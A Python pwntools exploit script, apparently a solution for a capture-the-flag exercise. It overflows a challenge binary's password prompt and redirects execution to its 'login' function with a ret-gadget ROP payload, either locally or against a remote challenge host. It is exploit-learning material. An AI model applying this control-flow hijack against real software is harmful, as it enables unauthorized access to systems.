#!/usr/bin/env python3
from pwn import *
context.update(arch='amd64', timeout=1)

exe = ELF("./2-misc-07-ret2func2")
rop = ROP(exe)
if args.GDB: # debug: local exploit with tmux/gef
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug("./bin", """
    source /home/user/.gdbinit-gef.py
    break *(main+42)
    continue
    """)
elif args.LOCAL: # exploit locally
    p = process("./bin")
else: # exploit online
    p = remote("cytech.tcdn.casa", 4207)

p.recvuntil(b"mot de passe:\n")

log.info("Payload:")
payload = flat({
    0x6161617461616173: (
        rop.ret.address, # l'adresse d'une instruction `ret` dans .text
        exe.sym['login'], # l'adresse de la fonction `login`
        ),
    })
log.hexdump(payload)
p.sendline(payload)
p.interactive()